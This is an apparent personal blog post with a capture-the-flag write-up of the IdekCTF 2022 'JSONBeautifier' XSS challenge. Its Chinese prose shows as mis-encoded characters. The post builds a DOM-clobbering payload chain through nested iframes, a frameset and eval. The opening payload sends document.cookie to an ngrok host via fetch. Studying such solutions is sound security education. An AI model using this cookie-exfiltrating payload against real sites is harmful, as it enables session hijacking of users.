<!doctype html>
<html lang="en-us"><head>
    <title>an4er&#39; blog</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    
    <link rel="shortcut icon" href="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/avatar.jpg" />
    
</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle" src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/avatar.jpg"/>
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        an4er
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    Want to be a Ctfer, Developer, Red Team
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../post/" title="Posts">Posts</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../categories/" title="Categories">Categories</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="https://github.com/an5er" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-2">
        <div class="mb-3">
            <h3 class="mb-0">IdekCTF 2022 XSS</h3>
            
            <small class="text-muted">Published January 25, 2023</small>
        </div>

        <article>
            <h2 id="jsonbeautifier">JSONBeautifier</h2>
<p>ä»<a href="https://www.zeyu2001.com/">@zeyu2001</a>å¸ˆå‚…çš„<code>payload</code>å­¦ä¹ èµ›ä¸­å¡ä½çš„ç›¸å…³åŸºç¡€çŸ¥è¯†åè‡ªå·±å°è¯•å¤ç°</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;x&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;/pre&gt;&lt;iframe name=&#39;fetch(&amp;quot;http://0.tcp.ngrok.io:15336?cookie=&amp;quot;+document.cookie)&#39; srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;#039;&lt;head&gt;&lt;title id=debug&gt;test&lt;/title&gt;&lt;/head&gt;&lt;frameset id=opts cols=x:eval(/*, */name)//&gt;&lt;/frameset&gt;&amp;#039;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot*/name)//&amp;quot}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>æºç ä¸å¤šï¼Œç®€å•çœ‹ä¸€ä¸‹æºç ï¼Œä¸€ä¸ª<code>flask</code>åº”ç”¨ä¸ºæœåŠ¡æ·»åŠ <code>CSP</code>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;script-src &#39;unsafe-eval&#39; &#39;self&#39;; object-src &#39;none&#39;;&#34;</span>
</span></span></code></pre></div><p>è¿™å…è®¸æˆ‘ä»¬ä½¿ç”¨åŒæºçš„<code>JS</code>æ–‡ä»¶å’Œ<code>eval</code>å‡½æ•°ï¼Œç„¶åæœ‰ä¸ª<code>main.js</code>æ–‡ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">userJson</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">inputBox</span>.<span style="color:#a6e22e">textContent</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cols</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">config</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">opts</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">cols</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">defaults</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cols</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">userJson</span>, <span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">cols</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">config</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">debug</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">defaults</span>.<span style="color:#a6e22e">debug</span>){
</span></span><span style="display:flex;"><span>		eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">beautified</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">outputBox</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;pre&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;`</span>
</span></span></code></pre></div><p>å› ä¸ºæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯<code>XSS</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›å…¥<code>eval</code>å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ç»™<code>this.config.debug</code>èµ‹å€¼ï¼Œè€Œä¸”ä¸‹é¢<code>outputBox.innerHTML</code>çš„èµ‹å€¼ä¸­çš„<code>output</code>å¯æ§ï¼Œ<code>JSON.stringify</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°å¯æ§çš„è¯å¯ä»¥å¯¼è‡´é€ƒé€¸å‡ºå­—ç¬¦ä¸²</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301201858635.png" alt="image-20230120185847518"></p>
<p>æˆ‘ä»¬å¯ä»¥å°†<code>&lt;pre&gt;</code>æ ‡ç­¾é—­åˆï¼Œç„¶åå°±å¯ä»¥æ’å…¥ä»»æ„<code>html</code>ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡æƒ³åˆ°<code>DOM clobbering</code>ï¼Œèµ›åå­¦ä¹ ä¸€ä¸‹</p>
<p><a href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
<p>åœ¨æ–‡ä¸­æåˆ°è¶…è¿‡ä¸‰å±‚çš„æ—¶å€™å¯ä»¥ä½¿ç”¨</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&#39; name=b&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">setTimeout</span>(()=&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">d</span>),<span style="color:#ae81ff">500</span>)&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>å› ä¸ºæˆ‘ä»¬åªéœ€è¦ä¸‰å±‚ï¼Œæ‰€ä»¥æˆ‘å°è¯•ç®€å•æ”¹é€ ä¸€ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;a id=opts name=cols href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=opts&gt;&#39; name=config&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><p>test.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cols</span>);
</span></span></code></pre></div><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™åœ¨æºä»£ç ä¸­<code>JSON.stringify</code>ä¼ å…¥çš„<code>cols</code>æ²¡æœ‰è¢«å½“æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè§¦å‘<code>toString</code>æ–¹æ³•ï¼Œä¼ å…¥çš„æ˜¯ä¸€ä¸ª<code>object</code>æ ‡ç­¾å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå¸¦æœ‰<code>cols</code>å±æ€§<code>html</code>æ ‡ç­¾ï¼Œå†™ä¸ª<code>js</code>æ‰¾ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#e6db74">&#34;abbr&#34;</span>,<span style="color:#e6db74">&#34;acronym&#34;</span>,<span style="color:#e6db74">&#34;address&#34;</span>,<span style="color:#e6db74">&#34;applet&#34;</span>,<span style="color:#e6db74">&#34;area&#34;</span>,<span style="color:#e6db74">&#34;article&#34;</span>,<span style="color:#e6db74">&#34;aside&#34;</span>,<span style="color:#e6db74">&#34;audio&#34;</span>,<span style="color:#e6db74">&#34;b&#34;</span>,<span style="color:#e6db74">&#34;base&#34;</span>,<span style="color:#e6db74">&#34;basefont&#34;</span>,<span style="color:#e6db74">&#34;bdi&#34;</span>,<span style="color:#e6db74">&#34;bdo&#34;</span>,<span style="color:#e6db74">&#34;bgsound&#34;</span>,<span style="color:#e6db74">&#34;big&#34;</span>,<span style="color:#e6db74">&#34;blink&#34;</span>,<span style="color:#e6db74">&#34;blockquote&#34;</span>,<span style="color:#e6db74">&#34;body&#34;</span>,<span style="color:#e6db74">&#34;br&#34;</span>,<span style="color:#e6db74">&#34;button&#34;</span>,<span style="color:#e6db74">&#34;canvas&#34;</span>,<span style="color:#e6db74">&#34;caption&#34;</span>,<span style="color:#e6db74">&#34;center&#34;</span>,<span style="color:#e6db74">&#34;cite&#34;</span>,<span style="color:#e6db74">&#34;code&#34;</span>,<span style="color:#e6db74">&#34;col&#34;</span>,<span style="color:#e6db74">&#34;colgroup&#34;</span>,<span style="color:#e6db74">&#34;command&#34;</span>,<span style="color:#e6db74">&#34;content&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#e6db74">&#34;datalist&#34;</span>,<span style="color:#e6db74">&#34;dd&#34;</span>,<span style="color:#e6db74">&#34;del&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>,<span style="color:#e6db74">&#34;dfn&#34;</span>,<span style="color:#e6db74">&#34;dialog&#34;</span>,<span style="color:#e6db74">&#34;dir&#34;</span>,<span style="color:#e6db74">&#34;div&#34;</span>,<span style="color:#e6db74">&#34;dl&#34;</span>,<span style="color:#e6db74">&#34;dt&#34;</span>,<span style="color:#e6db74">&#34;element&#34;</span>,<span style="color:#e6db74">&#34;em&#34;</span>,<span style="color:#e6db74">&#34;embed&#34;</span>,<span style="color:#e6db74">&#34;fieldset&#34;</span>,<span style="color:#e6db74">&#34;figcaption&#34;</span>,<span style="color:#e6db74">&#34;figure&#34;</span>,<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#e6db74">&#34;footer&#34;</span>,<span style="color:#e6db74">&#34;form&#34;</span>,<span style="color:#e6db74">&#34;frame&#34;</span>,<span style="color:#e6db74">&#34;frameset&#34;</span>,<span style="color:#e6db74">&#34;h1&#34;</span>,<span style="color:#e6db74">&#34;head&#34;</span>,<span style="color:#e6db74">&#34;header&#34;</span>,<span style="color:#e6db74">&#34;hgroup&#34;</span>,<span style="color:#e6db74">&#34;hr&#34;</span>,<span style="color:#e6db74">&#34;html&#34;</span>,<span style="color:#e6db74">&#34;i&#34;</span>,<span style="color:#e6db74">&#34;iframe&#34;</span>,<span style="color:#e6db74">&#34;image&#34;</span>,<span style="color:#e6db74">&#34;img&#34;</span>,<span style="color:#e6db74">&#34;input&#34;</span>,<span style="color:#e6db74">&#34;ins&#34;</span>,<span style="color:#e6db74">&#34;isindex&#34;</span>,<span style="color:#e6db74">&#34;kbd&#34;</span>,<span style="color:#e6db74">&#34;keygen&#34;</span>,<span style="color:#e6db74">&#34;label&#34;</span>,<span style="color:#e6db74">&#34;legend&#34;</span>,<span style="color:#e6db74">&#34;li&#34;</span>,<span style="color:#e6db74">&#34;link&#34;</span>,<span style="color:#e6db74">&#34;listing&#34;</span>,<span style="color:#e6db74">&#34;main&#34;</span>,<span style="color:#e6db74">&#34;map&#34;</span>,<span style="color:#e6db74">&#34;mark&#34;</span>,<span style="color:#e6db74">&#34;marquee&#34;</span>,<span style="color:#e6db74">&#34;menu&#34;</span>,<span style="color:#e6db74">&#34;menuitem&#34;</span>,<span style="color:#e6db74">&#34;meta&#34;</span>,<span style="color:#e6db74">&#34;meter&#34;</span>,<span style="color:#e6db74">&#34;multicol&#34;</span>,<span style="color:#e6db74">&#34;nav&#34;</span>,<span style="color:#e6db74">&#34;nextid&#34;</span>,<span style="color:#e6db74">&#34;nobr&#34;</span>,<span style="color:#e6db74">&#34;noembed&#34;</span>,<span style="color:#e6db74">&#34;noframes&#34;</span>,<span style="color:#e6db74">&#34;noscript&#34;</span>,<span style="color:#e6db74">&#34;object&#34;</span>,<span style="color:#e6db74">&#34;ol&#34;</span>,<span style="color:#e6db74">&#34;optgroup&#34;</span>,<span style="color:#e6db74">&#34;option&#34;</span>,<span style="color:#e6db74">&#34;output&#34;</span>,<span style="color:#e6db74">&#34;p&#34;</span>,<span style="color:#e6db74">&#34;param&#34;</span>,<span style="color:#e6db74">&#34;picture&#34;</span>,<span style="color:#e6db74">&#34;plaintext&#34;</span>,<span style="color:#e6db74">&#34;pre&#34;</span>,<span style="color:#e6db74">&#34;progress&#34;</span>,<span style="color:#e6db74">&#34;q&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>,<span style="color:#e6db74">&#34;rp&#34;</span>,<span style="color:#e6db74">&#34;rt&#34;</span>,<span style="color:#e6db74">&#34;rtc&#34;</span>,<span style="color:#e6db74">&#34;ruby&#34;</span>,<span style="color:#e6db74">&#34;s&#34;</span>,<span style="color:#e6db74">&#34;samp&#34;</span>,<span style="color:#e6db74">&#34;script&#34;</span>,<span style="color:#e6db74">&#34;section&#34;</span>,<span style="color:#e6db74">&#34;select&#34;</span>,<span style="color:#e6db74">&#34;shadow&#34;</span>,<span style="color:#e6db74">&#34;slot&#34;</span>,<span style="color:#e6db74">&#34;small&#34;</span>,<span style="color:#e6db74">&#34;source&#34;</span>,<span style="color:#e6db74">&#34;spacer&#34;</span>,<span style="color:#e6db74">&#34;span&#34;</span>,<span style="color:#e6db74">&#34;strike&#34;</span>,<span style="color:#e6db74">&#34;strong&#34;</span>,<span style="color:#e6db74">&#34;style&#34;</span>,<span style="color:#e6db74">&#34;sub&#34;</span>,<span style="color:#e6db74">&#34;summary&#34;</span>,<span style="color:#e6db74">&#34;sup&#34;</span>,<span style="color:#e6db74">&#34;svg&#34;</span>,<span style="color:#e6db74">&#34;table&#34;</span>,<span style="color:#e6db74">&#34;tbody&#34;</span>,<span style="color:#e6db74">&#34;td&#34;</span>,<span style="color:#e6db74">&#34;template&#34;</span>,<span style="color:#e6db74">&#34;textarea&#34;</span>,<span style="color:#e6db74">&#34;tfoot&#34;</span>,<span style="color:#e6db74">&#34;th&#34;</span>,<span style="color:#e6db74">&#34;thead&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>,<span style="color:#e6db74">&#34;title&#34;</span>,<span style="color:#e6db74">&#34;tr&#34;</span>,<span style="color:#e6db74">&#34;track&#34;</span>,<span style="color:#e6db74">&#34;tt&#34;</span>,<span style="color:#e6db74">&#34;u&#34;</span>,<span style="color:#e6db74">&#34;ul&#34;</span>,<span style="color:#e6db74">&#34;var&#34;</span>,<span style="color:#e6db74">&#34;video&#34;</span>,<span style="color:#e6db74">&#34;wbr&#34;</span>,<span style="color:#e6db74">&#34;xmp&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">props</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span>.<span style="color:#a6e22e">length</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#a6e22e">html</span>[<span style="color:#a6e22e">i</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">prop</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">obj</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">prop</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;cols&#39;</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">html</span>[<span style="color:#a6e22e">i</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&gt;&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">prop</span>)
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;\n&#39;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</span></span></code></pre></div><p>è¿è¡Œåå¾—åˆ°</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301201909812.png" alt="image-20230120190904772"></p>
<p>çœ‹ä¸‹<code>textarea</code>ï¼Œå°è¯•å‘ç°å…¶<code>cols</code>è®¾ç½®ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè·å¾—çš„<code>cols</code>å€¼æ˜¯é»˜è®¤çš„20</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202311262054777.png" alt="image-20230120191004704"></p>
<p>å°è¯•å‘ç°<code>&lt;frameset&gt;</code>å¯ç”¨</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202311262054756.png" alt="image-20230120191311950"></p>
<p>å³æ„é€ </p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">a</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe srcdoc=&#39;&lt;frameset id=opts cols=aaa&gt;&#39; name=config&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><p>ç„¶åå°±æ˜¯debugèµ‹å€¼ï¼Œå¦‚æœä½¿ç”¨çš„æ ‡ç­¾å’Œ<code>&lt;frameset&gt;</code>åŒåœ¨bodyé‡Œé¢ï¼Œé‚£ä¹ˆåªä¼šå‡ºç°å…¶ä¸­ä¸€ä¸ª</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202006633.png" alt="image-20230120200600580"></p>
<p>æ‰€ä»¥ä½¿ç”¨<code>&lt;head&gt;</code>ä¸­çš„æ ‡ç­¾ï¼Œè¿™é‡Œç”¨<code>title</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;iframe name=config srcdoc=&#39;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&#39;&gt;&lt;/iframe&gt;&lt;script src=./test.js&gt;&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><p>åœ¨iframeä¸­å¼•å…¥mian.jsï¼Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>ç„¶åå†…å±‚ä¹Ÿéœ€è¦ä¼ å…¥ç”¨æˆ·å¯æ§çš„json</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">json-input</span>&gt;{&amp;quot;x&amp;quot;:&amp;quot;x&amp;quot;}&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>åˆèµ·æ¥</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=aaa&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;x&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>æ­¤æ—¶æˆ‘ä»¬å¯æ§çš„<code>output</code>ä¸º</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202023919.png" alt="image-20230120202348875"></p>
<p>æ­¤æ—¶çš„colså¯æƒ³åˆ°ç”¨<code>a:eval(xx)//</code>æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºåœ¨jsä¸­ï¼Œæˆ‘ä»¬ä¼ å…¥çš„<code>output</code>å§‹ç»ˆä¼šç”¨<code>{}</code>ï¼Œæ‰€ä»¥æ‰§è¡Œèµ‹å€¼çš„æ—¶å€™éœ€è¦é…ä¸Šé”®å€¼å¯¹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span></code></pre></div><p>ä½†æ˜¯</p>
<p><img src="https://blog-1306976828.cos.ap-chengdu.myqcloud.com/blog/202301202027220.png" alt="image-20230120202700177"></p>
<p>JSON.stringify()æ¥æ”¶çš„ç¬¬ä¸‰ä¸ªå‚æ•°é™åˆ¶10ä¸ªå­—æ¯é•¿ï¼Œå¥½åœ¨jsonå­—ç¬¦ä¸²ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¯ä»¥ä½¿ç”¨æ³¨é‡Š<code>/**/</code>æ¥æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">a:eval(/*</span><span style="color:#f92672">&#34;x&#34;</span>:<span style="color:#e6db74">&#34;*/alert(111))//&#34;</span>
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><p>ä¹Ÿå°±æ˜¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;&lt;/pre&gt;&#34;</span>:<span style="color:#e6db74">&#34;&lt;iframe srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;quot;&lt;title id=debug&gt;a&lt;/title&gt;&lt;frameset id=opts cols=a:eval(/*&gt;&lt;/frameset&gt;&amp;quot;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot;*/alert(111))//&amp;quot;}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
</span></span></code></pre></div><p>å› ä¸ºæˆ‘ä»¬è¦è·å–cookieï¼Œç”¨fetchå³å¯</p>
